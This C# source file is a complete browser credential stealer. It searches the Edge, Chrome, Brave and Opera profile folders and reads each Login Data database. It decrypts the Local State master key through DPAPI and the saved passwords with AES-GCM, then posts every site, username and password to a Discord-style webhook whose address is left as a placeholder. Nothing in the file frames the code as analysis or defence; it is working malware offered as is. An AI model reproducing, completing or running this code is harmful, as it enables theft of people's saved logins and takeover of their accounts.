using System;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    private static readonly HttpClient client = new HttpClient(); // Add HttpClient

    static async Task Main(string[] args)
    {
        string[] searchPaths = new string[]
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Edge"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware", "Brave-Browser"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera Stable")
        };

        foreach (var path in searchPaths)
        {
            try
            {
                if (Directory.Exists(path))
                {
                    await ProcessBrowserPath(path);
                }
                else
                {
                    Console.WriteLine($"Directory not found: {path}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error processing path {path}: {ex.Message}");
            }
        }
    }

    static async Task ProcessBrowserPath(string basePath)
    {
        if (basePath.Contains("Chrome", StringComparison.OrdinalIgnoreCase))
        {
            await RetrievePasswords(basePath, "User Data/Default/Login Data", "User Data/Local State");

            for (int i = 1; ; i++)
            {
                string profilePath = Path.Combine(basePath, $"User Data/Profile {i}", "Login Data");
                if (File.Exists(profilePath))
                {
                    await RetrievePasswords(basePath, $"User Data/Profile {i}/Login Data", "User Data/Local State");
                }
                else
                {
                    break; // Stop if the profile does not exist.
                }
            }
        }
        else if (basePath.Contains("Opera Stable", StringComparison.OrdinalIgnoreCase))
        {
            await RetrievePasswords(basePath, "Default/Login Data", "Local State");
        }
        else
        {
            await RetrievePasswords(basePath, "User Data/Default/Login Data", "User Data/Local State");
        }
    }

    static async Task RetrievePasswords(string basePath, string loginDataRelPath, string localStateRelPath)
    {
        try
        {
            string loginDataPath = Path.Combine(basePath, loginDataRelPath);
            string localStatePath = Path.Combine(basePath, localStateRelPath);

            if (!File.Exists(loginDataPath) || !File.Exists(localStatePath))
            {
                Console.WriteLine("Required files not found. Skipping...");
                return;
            }

            string masterKey = ExtractMasterKey(localStatePath);

            using (var connection = new SQLiteConnection($"Data Source={loginDataPath};Version=3;"))
            {
                connection.Open();

                using (var command = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", connection))
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        string originUrl = reader.GetString(0);
                        string username = reader.GetString(1);
                        byte[] encryptedPassword = (byte[])reader[2];

                        string decryptedPassword = DecryptPassword(encryptedPassword, masterKey);
                        if (!string.IsNullOrEmpty(decryptedPassword))
                        {
                            Console.WriteLine($"Site: {originUrl}\nUsername: {username}\nPassword: {decryptedPassword}\n----------------------------------");
                            await SendToWebhook(originUrl, username, decryptedPassword);
                        }
                        else
                        {
                            Console.WriteLine($"Failed to decrypt password for {originUrl}");
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error retrieving passwords: {ex.Message}");
        }
    }

    static string ExtractMasterKey(string localStatePath)
    {
        try
        {
            string jsonContent = File.ReadAllText(localStatePath);
            using (JsonDocument document = JsonDocument.Parse(jsonContent))
            {
                JsonElement root = document.RootElement;

                if (root.TryGetProperty("os_crypt", out JsonElement osCrypt) &&
                    osCrypt.TryGetProperty("encrypted_key", out JsonElement encryptedKeyElement))
                {
                    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyElement.GetString());
                    encryptedKey = encryptedKey.Skip(5).ToArray(); // Strip DPAPI prefix

                    byte[] masterKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                    return Convert.ToBase64String(masterKey);
                }
                else
                {
                    throw new InvalidOperationException("Unable to find encrypted key in Local State file.");
                }
            }
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"Error extracting master key: {ex.Message}");
        }
    }

    static string DecryptPassword(byte[] encryptedPassword, string masterKeyBase64)
    {
        try
        {
            byte[] masterKey = Convert.FromBase64String(masterKeyBase64);

            const int prefixLength = 3;
            const int ivLength = 12;
            const int tagLength = 16;

            if (encryptedPassword.Length <= prefixLength + ivLength + tagLength)
            {
                throw new ArgumentException("Encrypted password data is too short.");
            }

            byte[] iv = encryptedPassword.Skip(prefixLength).Take(ivLength).ToArray();
            byte[] ciphertext = encryptedPassword.Skip(prefixLength + ivLength).Take(encryptedPassword.Length - (prefixLength + ivLength + tagLength)).ToArray();
            byte[] tag = encryptedPassword.Skip(encryptedPassword.Length - tagLength).ToArray();

            using (var aesGcm = new AesGcm(masterKey))
            {
                byte[] plaintext = new byte[ciphertext.Length];
                aesGcm.Decrypt(iv, ciphertext, tag, plaintext);
                return Encoding.UTF8.GetString(plaintext);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error decrypting password: {ex.Message}");
            return null;
        }
    }

    static async Task SendToWebhook(string site, string username, string password)
    {
        try
        {
            // Log the values to ensure they are not empty or null
            Console.WriteLine($"Preparing to send data:\nSite: {site}\nUsername: {username}\nPassword: {password}");

            // Validate if any value is null or empty
            if (string.IsNullOrWhiteSpace(site) || string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
            {
                Console.WriteLine("Invalid payload: One or more fields are empty. Skipping...");
                return; // Skip sending the request if any field is empty
            }

            string webhookUrl = "ton webhook";

            // Create a message content with the site, username, and password
            string content = $"**Site:** {site}\n**Username:** {username}\n**Password:** {password}";

            // Create a JSON payload
            var payload = new
            {
                content = content // The message content will be sent to Discord
            };

            // Serialize the payload to JSON
            string jsonPayload = JsonSerializer.Serialize(payload);

            // Create an HttpRequestMessage for a POST request
            var request = new HttpRequestMessage(HttpMethod.Post, webhookUrl)
            {
                Content = new StringContent(jsonPayload, Encoding.UTF8, "application/json")
            };

            // Send the request using HttpClient
            var response = await client.SendAsync(request);

            // Log the response content to get more details
            string responseContent = await response.Content.ReadAsStringAsync();
            Console.WriteLine($"Response Content: {responseContent}");

            // Check if the request was successful
            if (response.IsSuccessStatusCode)
            {
                Console.WriteLine("Password sent successfully.");
            }
            else
            {
                Console.WriteLine($"Failed to send password: {response.StatusCode}\nResponse: {responseContent}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error sending password to webhook: {ex.Message}");
        }
    }

}
